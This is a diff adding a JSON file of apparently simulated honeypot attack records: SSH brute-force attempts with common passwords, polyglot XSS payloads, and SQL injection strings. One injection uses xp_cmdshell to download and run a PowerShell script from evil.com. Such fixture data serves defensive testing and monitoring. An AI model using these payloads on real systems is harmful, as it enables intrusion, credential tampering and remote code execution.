+      "raw_log": "2025-04-14T10:43:02.739530 [HoneyPotSSHTransport,0,95.161.140.16] login attempt [b'ubuntu'/b'Welcome2022!'] failed",
+      "login_method": "ssh",
+      "attempts": 10
+    },
+    "attack_hash": "3bc1de0b2e06a30c5d43062994a802b0"
+  },
+  "81ff810e-cb3f-4b1d-9101-7c898da307d7": {
+    "id": "81ff810e-cb3f-4b1d-9101-7c898da307d7",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-14 10:43:08.428084",
+    "source_ip": "194.43.217.100",
+    "attack_type": "login_attempt",
+    "username": "devraj jhala",
+    "password": "devraj jhala123",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-14T10:43:08.428084 [HoneyPotSSHTransport,0,194.43.217.100] login attempt [b'devraj jhala'/b'devraj jhala123'] failed",
+      "login_method": "ssh",
+      "attempts": 6
+    },
+    "attack_hash": "8223b6ff930d87e4131c932caffb5d22"
+  },
+  "53c00a5c-0065-4303-bb6c-fbb0e612514c": {
+    "id": "53c00a5c-0065-4303-bb6c-fbb0e612514c",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-14 10:43:14.733487",
+    "source_ip": "104.236.20.251",
+    "attack_type": "login_attempt",
+    "username": "ssh",
+    "password": "P@ssw0rd!",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-14T10:43:14.733487 [HoneyPotSSHTransport,0,104.236.20.251] login attempt [b'ssh'/b'P@ssw0rd!'] failed",
+      "login_method": "ssh",
+      "attempts": 10
+    },
+    "attack_hash": "723001f19d8a360361cc77c33cea43f1"
+  },
+  "820b5d87-2a92-487d-836b-034be2f7a763": {
+    "id": "820b5d87-2a92-487d-836b-034be2f7a763",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-14 10:43:20.430098",
+    "source_ip": "185.207.167.67",
+    "attack_type": "login_attempt",
+    "username": "devraj jhala",
+    "password": "devraj jhala123",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-14T10:43:20.430098 [HoneyPotSSHTransport,0,185.207.167.67] login attempt [b'devraj jhala'/b'devraj jhala123'] failed",
+      "login_method": "ssh",
+      "attempts": 6
+    },
+    "attack_hash": "206b05997d6eb96115526bd9c52ab1e5"
+  },
+  "cf7233eb-3e70-4933-8787-03ab01a41fc0": {
+    "id": "cf7233eb-3e70-4933-8787-03ab01a41fc0",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-14 10:43:26.729625",
+    "source_ip": "13.138.140.135",
+    "attack_type": "login_attempt",
+    "username": "devraj jhala",
+    "password": "devraj jhala123",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-14T10:43:26.729625 [HoneyPotSSHTransport,0,13.138.140.135] login attempt [b'devraj jhala'/b'devraj jhala123'] failed",
+      "login_method": "ssh",
+      "attempts": 6
+    },
+    "attack_hash": "2d52e4fd0f1cd7b22bf219ab08413e46"
+  },
+  "d9aaef62-603f-4f9a-82fd-44b0819f871a": {
+    "id": "d9aaef62-603f-4f9a-82fd-44b0819f871a",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-14 10:43:32.438776",
+    "source_ip": "58.239.58.49",
+    "attack_type": "login_attempt",
+    "username": "admin",
+    "password": "ssh@4673",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-14T10:43:32.438776 [HoneyPotSSHTransport,0,58.239.58.49] login attempt [b'admin'/b'ssh@4673'] failed",
+      "login_method": "ssh",
+      "attempts": 10
+    },
+    "attack_hash": "df190da36b337547cfe7e39a9795e0fd"
+  },
+  "47e11e5f-9604-48eb-919d-d725c09afc65": {
+    "id": "47e11e5f-9604-48eb-919d-d725c09afc65",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-14 10:43:38.746645",
+    "source_ip": "95.186.68.214",
+    "attack_type": "login_attempt",
+    "username": "devraj jhala",
+    "password": "Welcome2022!",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-14T10:43:38.746645 [HoneyPotSSHTransport,0,95.186.68.214] login attempt [b'devraj jhala'/b'Welcome2022!'] failed",
+      "login_method": "ssh",
+      "attempts": 9
+    },
+    "attack_hash": "8cdfe88fddd09d2fe39fa83bd715171d"
+  },
+  "f1aa5b6a-613d-4478-8c84-3ae578b042b7": {
+    "id": "f1aa5b6a-613d-4478-8c84-3ae578b042b7",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-14 10:43:44.441898",
+    "source_ip": "217.222.210.57",
+    "attack_type": "login_attempt",
+    "username": "devraj jhala",
+    "password": "devraj jhala123",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-14T10:43:44.441898 [HoneyPotSSHTransport,0,217.222.210.57] login attempt [b'devraj jhala'/b'devraj jhala123'] failed",
+      "login_method": "ssh",
+      "attempts": 7
+    },
+    "attack_hash": "0539f77989e1a5ff19fcc452175f1662"
+  },
+  "28ae7633-a956-48a2-9e52-b575e989005e": {
+    "id": "28ae7633-a956-48a2-9e52-b575e989005e",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-14 10:43:50.743895",
+    "source_ip": "45.181.178.37",
+    "attack_type": "login_attempt",
+    "username": "azureuser",
+    "password": "devraj jhala123",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-14T10:43:50.743895 [HoneyPotSSHTransport,0,45.181.178.37] login attempt [b'azureuser'/b'devraj jhala123'] failed",
+      "login_method": "ssh",
+      "attempts": 8
+    },
+    "attack_hash": "f18fcad6759d3ee19fce978f65f5ef74"
+  },
+  "dd42bdd3-cd76-4991-a799-93ecb87a4f88": {
+    "id": "dd42bdd3-cd76-4991-a799-93ecb87a4f88",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-14 10:43:56.437370",
+    "source_ip": "13.2.111.136",
+    "attack_type": "login_attempt",
+    "username": "root",
+    "password": "Adm1n@123",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-14T10:43:56.437370 [HoneyPotSSHTransport,0,13.2.111.136] login attempt [b'root'/b'Adm1n@123'] failed",
+      "login_method": "ssh",
+      "attempts": 4
+    },
+    "attack_hash": "b02498544baf4f1acc91f1f58747ed64"
+  },
+  "0feb75e0-a31d-4107-af19-1ccb35bf1c6c": {
+    "id": "0feb75e0-a31d-4107-af19-1ccb35bf1c6c",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-14 14:42:02.955463",
+    "source_ip": "58.201.38.125",
+    "attack_type": "login_attempt",
+    "username": "ubuntu",
+    "password": "Welcome2022!",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-14T14:42:02.955463 [HoneyPotSSHTransport,0,58.201.38.125] login attempt [b'ubuntu'/b'Welcome2022!'] failed",
+      "login_method": "ssh",
+      "attempts": 6
+    },
+    "attack_hash": "59c0c178f59de6e25f3c0aa6660dc287"
+  },
+  "1637057b-918f-44d3-9b04-e089c94e3442": {
+    "id": "1637057b-918f-44d3-9b04-e089c94e3442",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-14 14:42:07.944970",
+    "source_ip": "176.67.127.44",
+    "attack_type": "login_attempt",
+    "username": "ubuntu",
+    "password": "r00tme",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-14T14:42:07.944970 [HoneyPotSSHTransport,0,176.67.127.44] login attempt [b'ubuntu'/b'r00tme'] failed",
+      "login_method": "ssh",
+      "attempts": 2
+    },
+    "attack_hash": "f73721d882661e0a98f84aa2cbbe3f09"
+  },
+  "88e2d0e0-70da-42fa-8465-e038efe85e24": {
+    "id": "88e2d0e0-70da-42fa-8465-e038efe85e24",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-14 14:42:14.259665",
+    "source_ip": "8.197.100.111",
+    "attack_type": "login_attempt",
+    "username": "devraj jhala",
+    "password": "devraj jhala123",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-14T14:42:14.259665 [HoneyPotSSHTransport,0,8.197.100.111] login attempt [b'devraj jhala'/b'devraj jhala123'] failed",
+      "login_method": "ssh",
+      "attempts": 8
+    },
+    "attack_hash": "3e2c6f57bfe654d02e2872a6b3d10ab8"
+  },
+  "dddf9444-4e42-45da-bff8-c121786728b8": {
+    "id": "dddf9444-4e42-45da-bff8-c121786728b8",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-14 14:42:19.946632",
+    "source_ip": "8.159.79.114",
+    "attack_type": "login_attempt",
+    "username": "devraj jhala",
+    "password": "devraj jhala123",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-14T14:42:19.946632 [HoneyPotSSHTransport,0,8.159.79.114] login attempt [b'devraj jhala'/b'devraj jhala123'] failed",
+      "login_method": "ssh",
+      "attempts": 8
+    },
+    "attack_hash": "91fa8ce7453c95cfe40332526819cb26"
+  },
+  "7baa87b9-47dc-4d39-bcc3-69a58af5ff56": {
+    "id": "7baa87b9-47dc-4d39-bcc3-69a58af5ff56",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-14 14:42:26.286430",
+    "source_ip": "62.56.168.188",
+    "attack_type": "login_attempt",
+    "username": "devraj jhala",
+    "password": "Welcome2022!",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-14T14:42:26.286430 [HoneyPotSSHTransport,0,62.56.168.188] login attempt [b'devraj jhala'/b'Welcome2022!'] failed",
+      "login_method": "ssh",
+      "attempts": 6
+    },
+    "attack_hash": "d018d898209868ab1acfc7f37ecc217a"
+  },
+  "8565a150-1351-474f-b6fb-96c367ee9c3e": {
+    "id": "8565a150-1351-474f-b6fb-96c367ee9c3e",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-14 14:42:32.828609",
+    "source_ip": "45.131.43.243",
+    "attack_type": "login_attempt",
+    "username": "devraj jhala",
+    "password": "devraj jhala123",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-14T14:42:32.828609 [HoneyPotSSHTransport,0,45.131.43.243] login attempt [b'devraj jhala'/b'devraj jhala123'] failed",
+      "login_method": "ssh",
+      "attempts": 4
+    },
+    "attack_hash": "28069a283b460214fd531aaac292e8b3"
+  },
+  "5ce06700-401a-4f09-8622-d431f2bd83a8": {
+    "id": "5ce06700-401a-4f09-8622-d431f2bd83a8",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-14 14:42:37.941775",
+    "source_ip": "34.39.177.241",
+    "attack_type": "login_attempt",
+    "username": "azureuser",
+    "password": "r00tme",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-14T14:42:37.941775 [HoneyPotSSHTransport,0,34.39.177.241] login attempt [b'azureuser'/b'r00tme'] failed",
+      "login_method": "ssh",
+      "attempts": 5
+    },
+    "attack_hash": "e7a52221068c15d3e4ed0343c55ea257"
+  },
+  "9f7b0a5b-b42a-4434-ba69-1150fca01999": {
+    "id": "9f7b0a5b-b42a-4434-ba69-1150fca01999",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-14 14:42:44.252187",
+    "source_ip": "58.138.167.222",
+    "attack_type": "login_attempt",
+    "username": "devraj jhala",
+    "password": "devraj jhala123",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-14T14:42:44.252187 [HoneyPotSSHTransport,0,58.138.167.222] login attempt [b'devraj jhala'/b'devraj jhala123'] failed",
+      "login_method": "ssh",
+      "attempts": 5
+    },
+    "attack_hash": "d0a7492176d300ede7e339670b2062fc"
+  },
+  "778204fc-f9e7-423e-8c27-748b2e387f74": {
+    "id": "778204fc-f9e7-423e-8c27-748b2e387f74",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-14 14:42:49.937713",
+    "source_ip": "13.167.6.191",
+    "attack_type": "login_attempt",
+    "username": "devraj jhala",
+    "password": "devraj jhala123",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-14T14:42:49.937713 [HoneyPotSSHTransport,0,13.167.6.191] login attempt [b'devraj jhala'/b'devraj jhala123'] failed",
+      "login_method": "ssh",
+      "attempts": 3
+    },
+    "attack_hash": "7b7ebf2336a3df34c094cc5e533433e0"
+  },
+  "e08dcab4-5890-4c4c-8dba-7d7777d81de0": {
+    "id": "e08dcab4-5890-4c4c-8dba-7d7777d81de0",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-14 14:42:56.249750",
+    "source_ip": "172.98.107.8",
+    "attack_type": "login_attempt",
+    "username": "root",
+    "password": "Welcome2022!",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-14T14:42:56.249750 [HoneyPotSSHTransport,0,172.98.107.8] login attempt [b'root'/b'Welcome2022!'] failed",
+      "login_method": "ssh",
+      "attempts": 5
+    },
+    "attack_hash": "93ecb7d3ff50a4c0040f8736f5b95c57"
+  },
+  "f3e9f581-e30f-4f4d-b86c-ca77bd1df3d4": {
+    "id": "f3e9f581-e30f-4f4d-b86c-ca77bd1df3d4",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-14 09:17:58",
+    "source_ip": "172.17.0.1]",
+    "attack_type": "login_attempt",
+    "username": "honeypot",
+    "password": "gladwin",
+    "details": {
+      "raw_log": "2025-04-14T09:17:58+0000 [HoneyPotSSHTransport,0,172.17.0.1] login attempt [b'honeypot'/b'gladwin'] failed"
+    },
+    "attack_hash": "f86a48fc11ab6ddc2091c723eec51cde"
+  },
+  "82f19439-8db8-4b2f-9b79-32d891763142": {
+    "id": "82f19439-8db8-4b2f-9b79-32d891763142",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-14 09:18:07",
+    "source_ip": "172.17.0.1]",
+    "attack_type": "login_attempt",
+    "username": "honeypot",
+    "password": "suryadev",
+    "details": {
+      "raw_log": "2025-04-14T09:18:07+0000 [HoneyPotSSHTransport,0,172.17.0.1] login attempt [b'honeypot'/b'suryadev'] failed"
+    },
+    "attack_hash": "754f90eaa6b8ea14119177d896f8ada6"
+  },
+  "78e8e88c-51e0-4a4e-9198-0fba6abfb653": {
+    "id": "78e8e88c-51e0-4a4e-9198-0fba6abfb653",
+    "honeypot_id": "4b8e898b-79c2-43b7-b8c1-2eca385caad7",
+    "timestamp": "2025-04-14 09:18:11",
+    "source_ip": "172.17.0.1]",
+    "attack_type": "login_attempt",
+    "username": "honeypot",
+    "password": "udit",
+    "details": {
+      "raw_log": "2025-04-14T09:18:11+0000 [HoneyPotSSHTransport,0,172.17.0.1] login attempt [b'honeypot'/b'udit'] failed"
+    },
+    "attack_hash": "a20cbadda213d4d3c3c9870a759b1e11"
+  },
+  "ffa2893e-f1e1-4a30-852e-c0f2813e62ff": {
+    "id": "ffa2893e-f1e1-4a30-852e-c0f2813e62ff",
+    "honeypot_id": "d9b89e15-9357-4ec7-a5b1-4cb727880769",
+    "timestamp": "2025-04-14 09:45:56",
+    "source_ip": "172.17.0.1]",
+    "attack_type": "login_attempt",
+    "username": "honeypot",
+    "password": "gladwin",
+    "details": {
+      "raw_log": "2025-04-14T09:45:56+0000 [HoneyPotSSHTransport,0,172.17.0.1] login attempt [b'honeypot'/b'gladwin'] failed"
+    },
+    "attack_hash": "f685d40d4d0e0a313bd4e580be6f8c32"
+  },
+  "c3d7bc7b-0f84-4f11-9c02-3852587e580c": {
+    "id": "c3d7bc7b-0f84-4f11-9c02-3852587e580c",
+    "honeypot_id": "d9b89e15-9357-4ec7-a5b1-4cb727880769",
+    "timestamp": "2025-04-14 09:45:59",
+    "source_ip": "172.17.0.1]",
+    "attack_type": "login_attempt",
+    "username": "honeypot",
+    "password": "udit",
+    "details": {
+      "raw_log": "2025-04-14T09:45:59+0000 [HoneyPotSSHTransport,0,172.17.0.1] login attempt [b'honeypot'/b'udit'] failed"
+    },
+    "attack_hash": "b7ff9641838ef749282c6d776e814e14"
+  },
+  "eb929b00-8a20-40d1-92c6-d66600f4c899": {
+    "id": "eb929b00-8a20-40d1-92c6-d66600f4c899",
+    "honeypot_id": "d9b89e15-9357-4ec7-a5b1-4cb727880769",
+    "timestamp": "2025-04-14 09:46:05",
+    "source_ip": "172.17.0.1]",
+    "attack_type": "login_attempt",
+    "username": "honeypot",
+    "password": "dad",
+    "details": {
+      "raw_log": "2025-04-14T09:46:05+0000 [HoneyPotSSHTransport,0,172.17.0.1] login attempt [b'honeypot'/b'dad'] failed"
+    },
+    "attack_hash": "3d727df9b7c0c21a88c98dee4b5ba50c"
+  },
+  "45683508-ab81-46a1-b385-ec251f6e9e56": {
+    "id": "45683508-ab81-46a1-b385-ec251f6e9e56",
+    "honeypot_id": "c026fa14-5bd9-44e1-af4c-7b1a68c14027",
+    "timestamp": "2025-04-14 09:52:57",
+    "source_ip": "172.17.0.1]",
+    "attack_type": "login_attempt",
+    "username": "honeypot",
+    "password": "gladwin",
+    "details": {
+      "raw_log": "2025-04-14T09:52:57+0000 [HoneyPotSSHTransport,0,172.17.0.1] login attempt [b'honeypot'/b'gladwin'] failed"
+    },
+    "attack_hash": "4237d1d5693b6d86f13d09cb10d58d62"
+  },
+  "8c479025-40a5-488c-b133-b328a3c75993": {
+    "id": "8c479025-40a5-488c-b133-b328a3c75993",
+    "honeypot_id": "c026fa14-5bd9-44e1-af4c-7b1a68c14027",
+    "timestamp": "2025-04-14 09:53:00",
+    "source_ip": "172.17.0.1]",
+    "attack_type": "login_attempt",
+    "username": "honeypot",
+    "password": "udit",
+    "details": {
+      "raw_log": "2025-04-14T09:53:00+0000 [HoneyPotSSHTransport,0,172.17.0.1] login attempt [b'honeypot'/b'udit'] failed"
+    },
+    "attack_hash": "ffece39433d7f0a1f46fe4c53632328f"
+  },
+  "73a79ac0-19e3-467a-8b0c-32e411922aae": {
+    "id": "73a79ac0-19e3-467a-8b0c-32e411922aae",
+    "honeypot_id": "c026fa14-5bd9-44e1-af4c-7b1a68c14027",
+    "timestamp": "2025-04-14 09:53:03",
+    "source_ip": "172.17.0.1]",
+    "attack_type": "login_attempt",
+    "username": "honeypot",
+    "password": "suryadev",
+    "details": {
+      "raw_log": "2025-04-14T09:53:03+0000 [HoneyPotSSHTransport,0,172.17.0.1] login attempt [b'honeypot'/b'suryadev'] failed"
+    },
+    "attack_hash": "6012675c96b19024f140670b71e90dce"
+  },
+  "b8f04c94-ea13-4dee-9a64-534792e8abe9": {
+    "id": "b8f04c94-ea13-4dee-9a64-534792e8abe9",
+    "honeypot_id": "c026fa14-5bd9-44e1-af4c-7b1a68c14027",
+    "timestamp": "2025-04-14 15:26:49.466011",
+    "source_ip": "58.188.172.118",
+    "attack_type": "xss",
+    "username": null,
+    "password": null,
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "payload": "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
+      "target_field": "name",
+      "raw_log": "2025-04-14T15:26:49.466011 [HoneyPotWeb,0,58.188.172.118] XSS attempt: javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
+      "insertion_point": "cookie",
+      "context": "attribute",
+      "evasion": [
+        "encoding",
+        "splitting",
+        "obfuscation"
+      ],
+      "exploit_type": "stored",
+      "target_browsers": [
+        "Chrome",
+        "Edge"
+      ]
+    },
+    "attack_hash": "f7e32cafd53ca6c640c97d56543f9c65"
+  },
+  "d580444a-3a5c-4585-9ed7-8c5dc55309e8": {
+    "id": "d580444a-3a5c-4585-9ed7-8c5dc55309e8",
+    "honeypot_id": "c026fa14-5bd9-44e1-af4c-7b1a68c14027",
+    "timestamp": "2025-04-14 15:26:52.397111",
+    "source_ip": "62.18.157.113",
+    "attack_type": "sql_injection",
+    "username": null,
+    "password": null,
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "payload": "'; WITH cte AS (SELECT TOP 1 username,password FROM users) UPDATE u SET u.password='pwned' FROM users u JOIN cte ON u.username=cte.username --",
+      "target_url": "http://192.168.1.100:22/login",
+      "raw_log": "2025-04-14T15:26:52.397111 [HoneyPotWeb,0,62.18.157.113] SQL injection attempt: '; WITH cte AS (SELECT TOP 1 username,password FROM users) UPDATE u SET u.password='pwned' FROM users u JOIN cte ON u.username=cte.username --",
+      "http_method": "POST",
+      "form_fields": {
+        "username": "' OR 1=1 --",
+        "password": "anything"
+      },
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
+        "Referer": "https://legitsite.com/login",
+        "X-Forwarded-For": "207.184.104.115"
+      },
+      "evasion_techniques": [
+        "encoding",
+        "comment injection",
+        "multi-line"
+      ]
+    },
+    "attack_hash": "f8de21323c12f632fce24af30cc2e590"
+  },
+  "64ede004-5965-4ec9-b547-9bccab51a941": {
+    "id": "64ede004-5965-4ec9-b547-9bccab51a941",
+    "honeypot_id": "c026fa14-5bd9-44e1-af4c-7b1a68c14027",
+    "timestamp": "2025-04-14 15:26:55.390363",
+    "source_ip": "194.50.217.128",
+    "attack_type": "sql_injection",
+    "username": null,
+    "password": null,
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "payload": "'; EXEC xp_cmdshell('powershell -c \"IEX (New-Object Net.WebClient).DownloadString(''http://evil.com/script.ps1'')'') --",
+      "target_url": "http://192.168.1.100:22/login",
+      "raw_log": "2025-04-14T15:26:55.390363 [HoneyPotWeb,0,194.50.217.128] SQL injection attempt: '; EXEC xp_cmdshell('powershell -c \"IEX (New-Object Net.WebClient).DownloadString(''http://evil.com/script.ps1'')'') --",
+      "http_method": "POST",
+      "form_fields": {
+        "username": "' OR 1=1 --",
+        "password": "anything"
+      },
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
+        "Referer": "https://legitsite.com/login",
+        "X-Forwarded-For": "64.183.27.95"
+      },
+      "evasion_techniques": [
+        "encoding",
+        "comment injection",
+        "multi-line"
+      ]
+    },
+    "attack_hash": "fad5fe2b3634ce46347e187153dbb5db"
+  },
+  "41a57ffa-32e2-4281-8ac5-cc378d1dfa7f": {
+    "id": "41a57ffa-32e2-4281-8ac5-cc378d1dfa7f",
+    "honeypot_id": "c026fa14-5bd9-44e1-af4c-7b1a68c14027",
+    "timestamp": "2025-04-14 15:26:58.396229",
+    "source_ip": "172.10.97.121",
+    "attack_type": "xss",
+    "username": null,
+    "password": null,
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
+      "target_field": "comment",
+      "raw_log": "2025-04-14T15:26:58.396229 [HoneyPotWeb,0,172.10.97.121] XSS attempt: jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
+      "insertion_point": "cookie",
+      "context": "attribute",
+      "evasion": [
+        "encoding",
+        "splitting",
+        "obfuscation"
+      ],
+      "exploit_type": "reflected",
+      "target_browsers": [
+        "Firefox",
+        "Safari"
+      ]
+    },
+    "attack_hash": "2a02bb513841f270a70eeaae91a11a4f"
+  },
+  "69550b9a-8db9-46df-bf49-406b4302828f": {
+    "id": "69550b9a-8db9-46df-bf49-406b4302828f",
+    "honeypot_id": "c026fa14-5bd9-44e1-af4c-7b1a68c14027",
+    "timestamp": "2025-04-14 15:27:01.400859",
+    "source_ip": "194.98.113.239",
+    "attack_type": "sql_injection",
+    "username": null,
+    "password": null,
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "payload": "' OR IF(SUBSTR(username,1,1)='a',SLEEP(5),0) FROM users --",
+      "target_url": "http://192.168.1.100:22/login",
+      "raw_log": "2025-04-14T15:27:01.400859 [HoneyPotWeb,0,194.98.113.239] SQL injection attempt: ' OR IF(SUBSTR(username,1,1)='a',SLEEP(5),0) FROM users --",
+      "http_method": "POST",
+      "form_fields": {
+        "username": "' OR 1=1 --",
+        "password": "anything"
+      },
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
+        "Referer": "https://legitsite.com/login",
+        "X-Forwarded-For": "181.202.2.228"
+      },
+      "evasion_techniques": [
+        "encoding",
+        "comment injection",
+        "multi-line"
+      ]
+    },
+    "attack_hash": "0791ad10b6de884f44a4d5d3702adbb7"
+  },
+  "ffd0be13-f08e-42b0-9f20-10fbf59386a4": {
+    "id": "ffd0be13-f08e-42b0-9f20-10fbf59386a4",
+    "honeypot_id": "c026fa14-5bd9-44e1-af4c-7b1a68c14027",
+    "timestamp": "2025-04-14 15:27:04.402545",
+    "source_ip": "217.19.131.144",
+    "attack_type": "sql_injection",
+    "username": null,
+    "password": null,
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "payload": "' OR IF(SUBSTR(username,1,1)='a',SLEEP(5),0) FROM users --",
+      "target_url": "http://192.168.1.100:22/login",
+      "raw_log": "2025-04-14T15:27:04.402545 [HoneyPotWeb,0,217.19.131.144] SQL injection attempt: ' OR IF(SUBSTR(username,1,1)='a',SLEEP(5),0) FROM users --",
+      "http_method": "POST",
+      "form_fields": {
+        "username": "' OR 1=1 --",
+        "password": "anything"
+      },
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
+        "Referer": "https://legitsite.com/login",
+        "X-Forwarded-For": "62.57.241.114"
+      },
+      "evasion_techniques": [
+        "encoding",
+        "comment injection",
+        "multi-line"
+      ]
+    },
+    "attack_hash": "a033b4679c652e539e3c38b373a86c51"
+  },
+  "5de0c2c7-ea4c-41bf-a721-fe98a6010e7e": {
+    "id": "5de0c2c7-ea4c-41bf-a721-fe98a6010e7e",
+    "honeypot_id": "c026fa14-5bd9-44e1-af4c-7b1a68c14027",
+    "timestamp": "2025-04-14 15:27:07.399089",
+    "source_ip": "8.20.176.76",
+    "attack_type": "login_attempt",
+    "username": "ec2-user",
+    "password": "udit123",
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "raw_log": "2025-04-14T15:27:07.399089 [HoneyPotSSHTransport,0,8.20.176.76] login attempt [b'ec2-user'/b'udit123'] failed",
+      "login_method": "ssh",
+      "attempts": 8
+    },
+    "attack_hash": "b52ff7846bf2dea278d0a61cd7e7a772"
+  },
+  "ddcc6353-4102-449b-a517-39da3d030555": {
+    "id": "ddcc6353-4102-449b-a517-39da3d030555",
+    "honeypot_id": "c026fa14-5bd9-44e1-af4c-7b1a68c14027",
+    "timestamp": "2025-04-14 15:27:10.399445",
+    "source_ip": "217.80.139.27",
+    "attack_type": "xss",
+    "username": null,
+    "password": null,
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "payload": "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
+      "target_field": "search",
+      "raw_log": "2025-04-14T15:27:10.399445 [HoneyPotWeb,0,217.80.139.27] XSS attempt: javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
+      "insertion_point": "body",
+      "context": "attribute",
+      "evasion": [
+        "encoding",
+        "splitting",
+        "obfuscation"
+      ],
+      "exploit_type": "reflected",
+      "target_browsers": [
+        "Safari",
+        "Firefox"
+      ]
+    },
+    "attack_hash": "1e45bb1419663f1a78ff16f93028af59"
+  },
+  "d507d973-9906-48eb-ac0d-5a450bb592a2": {
+    "id": "d507d973-9906-48eb-ac0d-5a450bb592a2",
+    "honeypot_id": "c026fa14-5bd9-44e1-af4c-7b1a68c14027",
+    "timestamp": "2025-04-14 15:27:13.395647",
+    "source_ip": "13.97.111.129",
+    "attack_type": "sql_injection",
+    "username": null,
+    "password": null,
+    "details": {
+      "simulated": true,
+      "complexity": "advanced",
+      "payload": "'; EXEC xp_cmdshell('powershell -c \"IEX (New-Object Net.WebClient).DownloadString(''http://evil.com/script.ps1'')'') --",
+      "target_url": "http://192.168.1.100:22/login",
+      "raw_log": "2025-04-14T15:27:13.395647 [HoneyPotWeb,0,13.97.111.129] SQL injection attempt: '; EXEC xp_cmdshell('powershell -c \"IEX (New-Object Net.WebClient).DownloadString(''http://evil.com/script.ps1'')'') --",
+      "http_method": "POST",
